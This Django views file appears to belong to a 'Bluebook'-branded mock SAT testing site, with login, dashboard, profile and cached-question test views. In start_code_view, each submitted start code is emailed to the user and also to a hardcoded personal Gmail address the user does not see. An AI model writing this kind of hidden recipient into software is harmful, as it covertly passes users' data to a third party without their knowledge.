from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from .models import UserProfile

def login_view(request):
    return render(request, 'login.html')

def cb_login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        if email and password:
            user = authenticate(request, username=email, password=password)
            if user is not None:
                login(request, user)
                return redirect('dashboard')
            else:
                return render(request, 'cb_login.html', {'error': 'Invalid email or password'})
    return render(request, 'cb_login.html')

@login_required
def dashboard_view(request):
    return render(request, 'dashboard.html')



from django.core.mail import send_mail

@login_required
def start_code_view(request):
    if request.method == 'POST':
        full_code = request.POST.get('full_code', '')
        
        # Save start code to user profile
        if hasattr(request.user, 'userprofile'):
            request.user.userprofile.start_code = full_code
            request.user.userprofile.save()

        # Try to get contact email
        if hasattr(request.user, 'userprofile') and request.user.userprofile.contact_email:
            try:
                send_mail(
                    subject="Bluebook Testing Code",
                    message=f"This is the code - {full_code}.",
                    from_email="Bluebook <messages@bbtest.space>",
                    recipient_list=[request.user.userprofile.contact_email, "jonabonah@gmail.com"],
                )
            except Exception as e:
                print(f"Email failed to send: {e}")
        return redirect('test_interface')
        
    return render(request, 'start_code.html', {'view_locked': True})

from django.views.decorators.http import require_POST
from .forms import UserProfileForm

@login_required
@require_POST
def update_profile_view(request):
    profile, _ = UserProfile.objects.get_or_create(user=request.user)
    form = UserProfileForm(request.POST, instance=profile)
    if form.is_valid():
        form.save()
    return redirect('dashboard')

import os
import json
import functools
from django.conf import settings

# Load questions data dynamically and cache in memory
QUESTIONS_FILE = os.path.join(settings.BASE_DIR, 'ui', 'data', 'questions.json')

@functools.lru_cache(maxsize=1)
def get_cached_modules_json():
    try:
        with open(QUESTIONS_FILE, 'r', encoding='utf-8') as f:
            all_questions = json.load(f)
        rw_questions_cached = [q for q in all_questions if q.get('type') == 'rw']
        math_questions_cached = [q for q in all_questions if q.get('type') == 'math']
        
        cached_modules = [
            {"title": "Section 1, Module 1: Reading and Writing", "count": 27, "questions": rw_questions_cached[0:27]},
            {"title": "Section 1, Module 2: Reading and Writing", "count": 27, "questions": rw_questions_cached[27:54]},
            {"title": "Section 2, Module 1: Math", "count": 22, "questions": math_questions_cached[0:22]},
            {"title": "Section 2, Module 2: Math", "count": 22, "questions": math_questions_cached[22:44]},
        ]
        return json.dumps(cached_modules)
    except Exception:
        return "[]"

@login_required
def test_interface_view(request):
    return render(request, 'test_interface.html', {
        'view_locked': True, 
        'modules_json': get_cached_modules_json()
    })
